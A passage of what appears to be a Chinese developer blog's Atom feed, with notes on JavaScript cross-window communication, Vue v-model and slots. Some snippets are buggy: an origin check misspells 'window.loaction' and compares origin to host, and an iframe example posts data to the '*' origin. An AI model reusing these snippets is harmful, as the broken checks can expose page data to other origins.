class="string">&#x27;_blank&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>index2.html</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">opener</span>.<span class="property">cb</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">opener</span>.<span class="title function_">cb</span>()</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">close</span>()</span><br></pre></td></tr></table></figure><p><strong>2. postmessage</strong></p><p><code>index1.html</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="function">(<span class="params">&#123; data, origin, source &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (origin !== <span class="variable language_">window</span>.<span class="property">loaction</span>.<span class="property">host</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;index2.html&#x27;</span>, <span class="string">&#x27;_blank&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>index2.html</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> data = &#123;&#125;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">opener</span>.<span class="title function_">postMessage</span>(data, <span class="variable language_">window</span>.<span class="property">opener</span>.<span class="property">loaction</span>.<span class="property">origin</span>)</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">close</span>()</span><br></pre></td></tr></table></figure><p><strong>3. storage 通过监听本地存储实现</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">addEventListener</span>) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;storage&quot;</span>, handleStorage, <span class="literal">false</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">attachEvent</span>(<span class="string">&quot;onstorage&quot;</span>, handleStorage);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>4. vue $bus</strong></p><ol><li>新建<code>modules.js</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Vue</span></span><br></pre></td></tr></table></figure><p><code>index1.html</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> middleUtils <span class="keyword">from</span> <span class="string">&#x27;./middleUtil.js&#x27;</span>;</span><br><span class="line"></span><br><span class="line">middleUtils.$on(<span class="string">&#x27;getData&#x27;</span>,  <span class="function">(<span class="params">data</span>)=&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;收到消息&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><code>index2.html</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> middleUtils <span class="keyword">from</span> <span class="string">&#x27;./middleUtil.js&#x27;</span>;</span><br><span class="line"></span><br><span class="line">middleUtils.$emit(<span class="string">&#x27;getData&#x27;</span>,<span class="string">&#x27;data&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="iframe-通信-（postmessage）"><a href="#iframe-通信-（postmessage）" class="headerlink" title="iframe 通信 （postmessage）"></a>iframe 通信 （postmessage）</h4><p><code>index1.html</code> 子页面</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">parent</span>.<span class="title function_">postMessage</span>(</span><br><span class="line">    &#123; <span class="attr">code</span>: <span class="number">0</span>, <span class="attr">msg</span>: <span class="string">&quot;修改成功&quot;</span>, <span class="attr">data</span>: <span class="variable language_">this</span>.<span class="property">allData</span> &#125;,</span><br><span class="line">    <span class="string">&quot;*&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><code>index2.html</code> 父级页面（引入iframe）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">iframe</span>.<span class="property">contentWindow</span>.<span class="property">parent</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="function">(<span class="params">&#123; data &#125;</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="comment">// console.log(&#x27;onMessage--&gt;&gt;&#x27;, data)</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">随手记录js手写, axios请求, 页面通信...</summary>
    
    
    
    <category term="随记" scheme="https://hisai3.github.io/hisai3.github.io/categories/%E9%9A%8F%E8%AE%B0/"/>
    
    
    <category term="javascript" scheme="https://hisai3.github.io/hisai3.github.io/tags/javascript/"/>
    
    <category term="axios" scheme="https://hisai3.github.io/hisai3.github.io/tags/axios/"/>
    
  </entry>
  
  <entry>
    <title>Vue指令 v-model</title>
    <link href="https://hisai3.github.io/hisai3.github.io/2023/01/14/Vue%E6%8C%87%E4%BB%A4%20v-model/"/>
    <id>https://hisai3.github.io/hisai3.github.io/2023/01/14/Vue%E6%8C%87%E4%BB%A4%20v-model/</id>
    <published>2023-01-14T06:31:31.000Z</published>
    <updated>2023-01-15T07:08:39.689Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Vue指令-v-model"><a href="#Vue指令-v-model" class="headerlink" title="Vue指令 v-model"></a>Vue指令 v-model</h2><p>Vue自定义组件使用 <code>v-model</code></p><ol><li>方式一 v-model 的本质 <code>value</code>属性  <code>input</code>事件</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 子组件</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">props</span>: &#123;</span><br><span class="line">    <span class="attr">tabs</span>: &#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="title class_">Array</span>,</span><br><span class="line">      <span class="attr">default</span>: <span class="function">() =&gt;</span> []</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">value</span>: &#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="title class_">Number</span>,</span><br><span class="line">      <span class="attr">default</span>: <span class="number">0</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">methods</span>: &#123;</span><br><span class="line">    <span class="title function_">onChange</span>(<span class="params">index</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.$emit(<span class="string">&#x27;input&#x27;</span>, index)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 父组件中使用</span></span><br><span class="line"> <span class="language-xml"><span class="tag">&lt;<span class="name">tab</span> <span class="attr">v-model</span>=<span class="string">&quot;current&quot;</span> /&gt;</span></span></span><br><span class="line">     </span><br></pre></td></tr></table></figure><ol start="2"><li>官方文档提供方法</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 子组件</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">model</span>: &#123;</span><br><span class="line">    <span class="attr">prop</span>: <span class="string">&#x27;checked&#x27;</span>, <span class="comment">// 设置响应属性</span></span><br><span class="line">    <span class="attr">event</span>: <span class="string">&#x27;change&#x27;</span>  <span class="comment">// 必须派发一个‘event’定义的事件</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">props</span>: &#123;</span><br><span class="line">    <span class="attr">checked</span>: <span class="title class_">Boolean</span> <span class="comment">// 必须有 model.prop 定义的属性</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">methods</span>: &#123;</span><br><span class="line">    <span class="title function_">onChange</span>(<span class="params">index</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.$emit(<span class="string">&#x27;change&#x27;</span>, index)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 父组件中使用</span></span><br><span class="line"> <span class="language-xml"><span class="tag">&lt;<span class="name">tab</span> <span class="attr">v-model</span>=<span class="string">&quot;current&quot;</span> /&gt;</span></span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Vue指令-v-model&quot;&gt;&lt;a href=&quot;#Vue指令-v-model&quot; class=&quot;headerlink&quot; title=&quot;Vue指令 v-model&quot;&gt;&lt;/a&gt;Vue指令 v-model&lt;/h2&gt;&lt;p&gt;Vue自定义组件使用 &lt;code&gt;v-model&lt;/</summary>
      
    
    
    
    
    <category term="Vue指令" scheme="https://hisai3.github.io/hisai3.github.io/tags/Vue%E6%8C%87%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>Vue插槽</title>
    <link href="https://hisai3.github.io/hisai3.github.io/2023/01/14/Vue%E6%8F%92%E6%A7%BD/"/>
    <id>https://hisai3.github.io/hisai3.github.io/2023/01/14/Vue%E6%8F%92%E6%A7%BD/</id>
    <published>2023-01-14T06:31:31.000Z</published>
    <updated>2023-01-15T07:08:45.195Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Vue插槽"><a href="#Vue插槽" class="headerlink" title="Vue插槽"></a>Vue插槽</h2><p>定义 <code>navigation-link </code>组件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">v-bind:href</span>=<span class="string">&quot;url&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span> &gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">slot</span>&gt;</span>啦啦啦啦啦了--这是默认内容<span class="tag">&lt;/<span class="name">slot</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 使用 --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">navigation-link</span> <span class="attr">url</span>=<span class="string">&quot;/profile&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 添加一个 Font Awesome 图标 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;fa fa-user&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  Your Profile</span><br><span class="line"><span class="tag">&lt;/<span class="name">navigation-link</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 如果 &lt;navigation-link&gt; 没有包含一个 &lt;slot&gt; 元素，则该组件起始标签和结束标签之间的任何内容都会被抛弃。 --&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>具名插槽</p><p>定义 <code>&lt;base-layout&gt;</code>  组件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">&quot;header&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 我们希望把页头放这里 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">main</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- name 默认为 default --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 我们希望把页脚放这里 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>向具名插槽提供内容，可以在一个 <code>&lt;template&gt;</code> 元素上使用 <code>v-slot</code> 指令，并以 <code>v-slot</code> 的参数的形式提供其名称</p><p><strong>v-slot 只能添加在 <template> 上</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 使用 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base-layout</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot:header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Here might be a page title<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 任何没有被包裹在带有 v-slot 的 &lt;template&gt; 中的内容都会被视为默认插槽的内容。 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>A paragraph for the main content.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>And another one.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">base-layout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>作用域插槽</p><p>定义<code>&lt;current-user&gt;</code> 组件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">slot</span>&gt;</span>&#123;&#123; user.lastName &#125;&#125;<span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">current-user</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- user 实在current-user 中定义的 在父组件使用时无法获取 --&gt;</span></span><br><span class="line">  &#123;&#123; user.firstName &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">current-user</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 解决： 修改子组件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">slot</span> <span class="attr">v-bind:user</span>=<span class="string">&quot;user&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123; user.lastName &#125;&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 解决： 使用 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">current-user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot:default</span>=<span class="string">&quot;slotProps&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123; slotProps.user.firstName &#125;&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">current-user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>v-slot</strong> 必须在template上使用</p><p><strong>slot-scope</strong> 可以不在template上使用</p><h4 id="在render-中使用slot"><a href="#在render-中使用slot" class="headerlink" title="在render 中使用slot"></a>在render 中使用slot</h4><p><strong>使用场景:</strong> 在二次封装<code>u-table组件</code>时，多表头的<strong>递归列</strong>中的<code>slot</code>只能使用到第一层</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// scopedSlots 的使用相当于在调用组件时插入插槽的实际内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $scopedSlots 相当于作用域插槽参数即slot绑定的数据  前提时在调用组件时有使用slot</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;CusColumn&#x27;</span>,</span><br><span class="line">  <span class="attr">props</span>: &#123;</span><br><span class="line">    <span class="attr">column</span>: &#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="title class_">Object</span>,</span><br><span class="line">      <span class="attr">default</span>: <span class="function">() =&gt;</span> &#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">treeNode</span>: &#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="title class_">Boolean</span>,</span><br><span class="line">      <span class="attr">default</span>: <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; column, treeNode &#125; = <span class="variable language_">this</span></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">getChild</span> = (<span class="params">data</span>) =&gt; &#123;</span><br><span class="line">      <span class="keyword">return</span> data.<span class="title function_">map</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> !item.<span class="property">isShow</span> ? (</span><br><span class="line">          <span class="language-xml"><span class="tag">&lt;<span class="name">u-table-column</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">prop</span>=<span class="string">&#123;</span> <span class="attr">item.prop</span> &#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">label</span>=<span class="string">&#123;</span> <span class="attr">item.label</span> === <span class="string">&#x27;-&#x27;</span> ? &#x27;<span class="attr">完成时间</span>&#x27; <span class="attr">:</span> <span class="attr">item.label</span> &#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">align</span>=<span class="string">&#123;</span> <span class="attr">item.align</span> || &#x27;<span class="attr">center</span>&#x27; &#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">fixed</span>=<span class="string">&#123;</span> <span class="attr">item.fixed</span> &#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">width</span>=<span class="string">&#123;</span> <span class="attr">item.width</span> &#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">min-width</span>=<span class="string">&#123;</span> <span class="attr">item.mWidth</span> &#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">treeNode</span>=<span class="string">&#123;</span> <span class="attr">treeNode</span> &#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">show-overflow-tooltip</span>=<span class="string">&#123;</span> <span class="attr">true</span> &#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">scopedSlots</span>=<span class="string">&#123;&#123;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">default:</span> (&#123; <span class="attr">row</span>, $<span class="attr">index</span>, <span class="attr">column</span> &#125;) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-xml">                return item.isTemplate &amp;&amp; this.$scopedSlots[item.prop]</span></span><br><span class="line"><span class="language-xml">                  ? this.$scopedSlots[item.prop](&#123; row, $index, column &#125;)</span></span><br><span class="line"><span class="language-xml">                  : (</span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">&#123;item.prop&#125;</span>&gt;</span>&#123; row[item.prop] &#125;<span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  )</span></span><br><span class="line"><span class="language-xml">              &#125;</span></span><br><span class="line"><span class="language-xml">            &#125;&#125;</span></span><br><span class="line"><span class="language-xml">          &gt;</span></span><br><span class="line"><span class="language-xml">            &#123;</span></span><br><span class="line"><span class="language-xml">              ...getChild(item.children || [])</span></span><br><span class="line"><span class="language-xml">            &#125;</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">u-table-column</span>&gt;</span></span></span><br><span class="line">        ) : <span class="literal">null</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">getChild</span>([column])</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>解析</p><p>父组件设置 slot</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">   <span class="keyword">const</span> slotName = <span class="string">&#x27;topbar&#x27;</span> || <span class="string">&#x27;default&#x27;</span></span><br><span class="line">   <span class="keyword">const</span> scopeSlotChild = <span class="variable language_">this</span>.<span class="property">$slots</span>[slotName]</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span> &#123; scopeSlotChild &#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">   )</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>父组件设置 slot-scope</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> scopedSlots = &#123;</span><br><span class="line">        <span class="comment">// 默认插槽</span></span><br><span class="line">        <span class="attr">default</span>: <span class="function"><span class="params">slotProps</span> =&gt;</span> [ <span class="language-xml"><span class="tag">&lt;<span class="name">Cmp</span> <span class="attr">slotprops</span>=<span class="string">&#123;slotprops&#125;</span> /&gt;</span></span> ],</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 具名插槽</span></span><br><span class="line">        <span class="attr">footer</span>:  <span class="function"><span class="params">slotProps</span> =&gt;</span> [ <span class="language-xml"><span class="tag">&lt;<span class="name">Button</span> <span class="attr">slotprops</span>=<span class="string">&#123;slotprops&#125;</span> /&gt;</span></span> ]</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>子组件获取 slotProps</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;parent </span><br><span class="line">    &#123; ...&#123;</span><br><span class="line">         <span class="attr">scopedSlots</span>: &#123;</span><br><span class="line">            <span class="attr">default</span>: <span class="function"><span class="params">scope</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;this.scope.data&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&gt;</span><br><span class="line">&lt;/parent&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Vue插槽&quot;&gt;&lt;a href=&quot;#Vue插槽&quot; class=&quot;headerlink&quot; title=&quot;Vue插槽&quot;&gt;&lt;/a&gt;Vue插槽&lt;/h2&gt;&lt;p&gt;定义 &lt;code&gt;navigation-link &lt;/code&gt;组件&lt;/p&gt;
